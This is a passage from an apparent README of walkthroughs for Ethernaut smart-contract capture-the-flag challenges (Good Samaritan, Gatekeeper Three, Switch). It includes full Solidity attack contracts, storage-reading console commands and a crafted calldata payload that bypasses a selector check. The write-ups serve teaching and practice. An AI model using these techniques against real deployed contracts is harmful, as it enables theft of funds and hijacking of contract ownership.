Well, the vulnerability lies in that `requestDonation()` function itself as if somehow we managed to pop out that error `NotEnoughBalance()` then we can get all the coins from the wallet contract. If you notice the last piece of code within the question itself, you will find we are given an interface `INotifyable` which contains of an `notify` function and is used further in `transfer` function in order to notify the requestor about the transfer if it's a contract.

```solidity
    // where dest_ is the address, and amount_ is the amount of coins to transfer
    if (dest_.isContract()) {
        INotifyable(dest_).notify(amount_);
    }
```

Guess this is the key, let me again wrap up the procedure before we arrive to the exact solution:

1. First, the requestor calls the `requestDonation()` function.
2. Then the function checks whether `GoodSamaritan` consists of enough coins in his wallet or not by executing `donate10` function (wallet contract) as a condition.
3. We know, it do have enough coins (that's why we are attacking) and thus in `donate10` it executes the `else` condition which leads to execute `transfer()` function (coin contract).
4. Now, heres the catch - In transfer function, if we are able to invoke that error `NotEnoughBalance()` here as it execute that `notify` function in the `if` condition, we will reach to that `else` condition in `requestDonation()` function due to this error (as the error is being checked in the `try` block) and then it will check the error message through the keccak256 hash which will be true and thus calling the `tranferRemainder` function which will transfer all the coins to the requestor (us).

Here's our attacking contract:

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8.0 <0.9.0;

    interface GoodSamaritan{
        function requestDonation() external returns(bool);
    }

    contract Attack{
        GoodSamaritan public target;

        error NotEnoughBalance();

        constructor(address _victim){
            target = GoodSamaritan(_victim);
        }

        // this function will be called when invoked by coin contract, thus reverting the "NotEnoughBalance" error
        function notify(uint256 amount) pure external{
            if (amount <= 10){
                revert NotEnoughBalance();
            }
        }

        function attack() external {
            target.requestDonation();
        }

    }
```

All you have to do is, copy the instance address of the `GoodSamaritan` contract and then deploy the `Attack` contract by passing the copied address as an argument and then call the `attack` function. That's it!

## 28 - Gatekeeper Three

For reference -> [Challenge](./questions/28.Gatekeeper_Three.sol) | [Solution](./answers/28.Gatekeeper%20Three/)

Here's the third gatekeeper challenge, like the last ones our task to get through all three gates by calling the and this time it's quite easy and straight forward. Also, we got another contract with our main `GatekeeperThree` contract which is `SimpleTrick`. Will advice you to get read that contract carefully as I be mentioning parts from it like always and thus try not to get confused when I am naming the function to be talked about...Let's begin!

We got our main contract i.e `GatekeeperThree`. Let's find the solution of tackling each modifier (or gates) which then be used in `enter` function.

**GateOne:** Simple and straight like always, We have to use a different contract here in order to interact with `GatekeeperThree` as that will keep the msg.sender as owner and tx.origin as different than the owner. The first thing we gonna do in order to become the owner of `GatekeeperThree` is call it's `construct-1rr` (read it again). Yea, you got it probably...there's a type mistake which let's us call that faulty function and become the owner.

```solidity
    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }
```

**GateTwo:** Here we need the boolean `allowEntrance` to be true. If you look at the `getAllowance` function, there's the way to make it true but it needs a password. Here `SimpleTrick` contract comes in hand. We are given a separate function `createTrick` to initialize our own `SimpleTrick` contract with our `GatekeeperThree` contract's address as the parameter which will point the `target` to our `GatekeeperThree` contract (look within the constructor of `SimpleTrick` contract). Additionally, `trickInit` is also called to initialize the `trick` variable with the address of the `SimpleTrick` contract.

```solidity
    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }
```

```solidity
    /// Functions related to GatekeeperThree contract

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }



    /// Functions related to SimpleTrick contract

    constructor (address payable _target) {
        target = GatekeeperThree(_target);
    }
        
    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
        return true;
        }
        password = block.timestamp;
        return false;
    }
        
    function trickInit() public {
        trick = address(this);
    }
        
    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
```

Now, we got to do something with that `SimpleTrick` contract we intialized. It got a private variable `password` with block.timestamp value and is on 3rd slot. So far, we are clear that `private` doesn't protect the secrets. Thus, using the code -> `await web3.eth.getStorageSlot(contract_address, 3, console.log)` within the browser's console will give us the password but in hexadecimals. But, we need it in `uint` format. You can get it either by converting that hexadecimals into decimal online or by using `parseInt` function in the console itself. Now, using the browser's console call the `getAllowance` function with the password (in uint) as the argument and we got our `allowEntrance` to be true.

**GateThree:** The last gate contains a condition which requires the balance of the `GatekeeperThree` contract to be greater than 0.001 ether which is easy, and it also needs to make sure that the owner (i.e the contract we are using to call the `enter` function) ain't able to get 0.001 ether paid from the `GatekeeperThree` contract. If one knows the basic then he/she knows that in order to send ether to a contract it must consists of either a `receive` or `fallback` function. But our attacking contract won't be having both of them. Thus, the condition `payable(owner).send(0.001 ether) == false` will satifsy and we will be able to pass through the last gate.

```solidity
    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }
```

Here's our `Attack` contract which be using in order to solve this challenge:

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface GateKeeperThree{
        function construct0r() external ;
        function enter() external ;
    }

    contract Attack {
        GateKeeperThree public target;

        constructor(address victim){
            target = GateKeeperThree(victim);
        }

        function beOwner() external{
            target.construct0r();
        }

        function attack() external{
            target.enter();
        }
    }
```

Now, let me follow through the exact steps you need to take in order to solve this challenge:

1. Deploy the `Attack` contract by passing the instance address of the `GatekeeperThree` contract as an argument and call the `beOwner` function in order to become the owner. This will get us cleared through the first gate.

2. Now we need to call the `createTrick` function using the browser's console which will initialize the `SimpleTrick` contract with the address of `GatekeeperThree` contract as an argument.

3. Now, call the `trick` variable using `await contract.trick()` as trick is a variable which contains the address of SimpleTrick contract. Here we are talking about `SimpleTrick public trick` in `GatekeeperThree` contract, not the other one which is present in `SimpleTrick` contract.

4. With that we will get an address in the console, thus store the address and then look for the password within the 3rd slot...Here it goes:

```javascript
    const addr = "your_trick_address"
    await web3.eth.getStorageAt(addr, 3, console.log)
```

5. Now, convert the hexadecimals into decimal (uint) and then call the `getAllowance` function with the password as an argument using the browser's console. You can even check whether `allowEntrance` is true or not by calling `await contract.allowEntrance()`. This opens our gate Two.

6. For the last gate, all you have to do is send some ether greater than 0.001 to the `GatekeeperThree` contract using `await contract.sendTransaction({value: 1100000000000000})` and the 2nd condition will be satisfied as we don't have a `receive` or `fallback` function in our attacking contract. Now, call the `attack` function and submit the instance...Cheers!

## 29 - Switch

For reference -> [Challenge](./questions/29.Switch.sol) | [Solution](./answers/29.Switch.js)

This challenge is interesting and got us a knowledge about calldata encoding which gonna be worthy to understand. Here, we got a contract named `Switch` where our task is to turn the boolean `switchOn` to true. There are several functions given to us like, `flipSwitch`, `turnSwitchOn` and `turnSwitchOff`, And two modifiers i.e `onlyOff` and `onlyThis`. Let's talk about them a bit like what they do, such that we will have a better idea in solving this challenge.

`turnSwitchOn` and `turnSwitchOff` are very similar as both of them turn `switchOn` to true and false respectively. They both use `onlyThis` modifier which seeks that the caller of these two functions should be the address itself, which is quite tricky to find a way against.

```solidity
    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
```

Now comes the `flipSwitch` function which takes a parameter `bytes memory _data` i.e some calldata which can be passed to this function. Thus, this function will help us in calling both `turnSwitchOn` and `turnSwitchOff` as all we have to do is form our calldata in such a way that we are able to call these two functions. It also uses `onlyOff` function which I will talk about in a while.

```solidity
    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    } 
```

Here I am pointing to a section within the solidity docs which is about function selectors and arguments encoding that be really helpful here. I would have explained you the same, but these docs have really done a fantastic job in explaining it: [Function Selector and Argument encoding](https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#function-selector-and-argument-encoding)

If that confuses a bit, do take a help from chatGPT. And, if you are really sure what does it mean by function selectors, offsets, lengths and how various data types is used as arguments within the encoding i.e storing `uint` and an array of `bytes` is often different, then you are good to go!

As promised, now let's talk about the `onlyOff` modifier. The code line `bytes32[1] memory selector` indicates that the array selector will consists of just 1 element of bytes32.

```solidity
    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
```

Next comes the `calldatacopy` within the assembly, what it does is copied data from the calldata to the memory. Keep in mind that the calldata is the data we will be providing to the EVM, and calldatacopy takes that data and stores in its memory. Now there are several parameters which are useful here, `selector` tells from where the starting position in memory at where the data will get copied to, `68` is the offset which tells the starting position in calldata where we should start copying from, and `4` is the length that tells how much bytes of data to copy.
Thus `calldatacopy(selector, 68, 4)` means that -> From the given calldata, skip first 67 bytes and copy 4 bytes of data from 68th byte, then store it in selector within the memory.

Next comes the `require` statement which checks whether the data within the selector (which we copied using calldatacopy) is equal to the `offSelector` or not. Just letting you know, `offSelector` is mentioned right below the boolean `switchOn` and it's consists of first 4 bytes of the keccak hash of `turnSwitchOff` function. Usually, function selectors are first 4 bytes of any function's keccak hash. Thus, if the data within the selector contains the function selector of `turnSwitchOff` then the require condition be true.

Now, the question is how to make that require statement true. The answer is right there in `calldatacopy`, all we need to do is pass such type of data that at 68th byte the function selector of `turnSwitchOff` function is present. Plus, we have to call `turnSwitchOn` in the same calldata as that's what the main motive is.

Now, let's create our calldata in order to solve this challenge:

1. First we will include the function selector of `flipSwitch` function. For this all you need to do is, get a keccak256 hash of `flipSwitch(bytes)` and take first 4 bytes of it i.e 0x30c13ade. Thus, our first 4 bytes of calldata will look like this -> `30c13ade`.

2. Next, we will be including the offset here as `flipSwitch` takes data in the form of bytes and we have to run that `turnSwitchOn` function. Thus, our data will contains the offset where the function selector of `turnSwitchOn` is present such that EVM could pick it up easily. Now, whoever is thinking what about the `turnSwitchOff` which we need to pass through the modifier, it will be just for a show as we don't really want to run this function just include it. Hence the offset gonna be 96 bytes i.e will be pointing at `turnSwitchOn` (length + function selector). It will look like this -> `0000000000000000000000000000000000000000000000000000000000000060`

3. Here, we can't include `turnSwitchOff` function selector as it should appear on 68th byte according to the `onlyOff` modifier check. Thus, will leave it empty i.e 32 bytes of zeroes -> `0000000000000000000000000000000000000000000000000000000000000000`

4. Now, we are at 68th byte according to the offset related to `calldatacopy` and hence will include the funtion selector of `turnSwitchOff` function by taking the first 4 bytes of keccak hash of `turnSwitchOff()` and padding it with zeroes to make it 32 bytes value. It looks like this -> `20606e1500000000000000000000000000000000000000000000000000000000`

5. Here, we are at the 96th byte as per the offset on 2nd point. There's a thing I would like to say as some might have confusion related to the statement, "how we are at 96th byte here, despite the fact that it should be 100th". Actually, for `calldatacopy` the calldata starts right from the function selector of `flipSwitch` whereas when we are inside the `flipSwitch` function, the calldata starts from the offset i.e 0x00...60, hope that clears the case. Moreover, here we will be inlcuding length first and then the actual data, as when one says about pointing at any data, it points to the length if it exists. Thus, it will look like this -> `0000000000000000000000000000000000000000000000000000000000000004`

6. At last, the function selector of `turnSwitchOn()` function -> `76227e1200000000000000000000000000000000000000000000000000000000`

7. Here's a recap of all those combined values:

```typescript
    // Calldata layout ->
    // 30c13ade -> function selector for flipSwitch(bytes memory data)
    // 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field -> 0x60 = 96 bytes
    // 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
    // 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
    // 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field -> 96th byte starts from here
    // 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()
```

Hence we got the combined calldata that we gotta pass: `30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000`

Now, go to your browser's console and store this calldata value in a variable let's say `attack`

Send this transaction and submit!

```javascript
    await sendTransaction({
        from: player,
        to: contract.address,
        data: attack
    })
```

## Contributing

Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
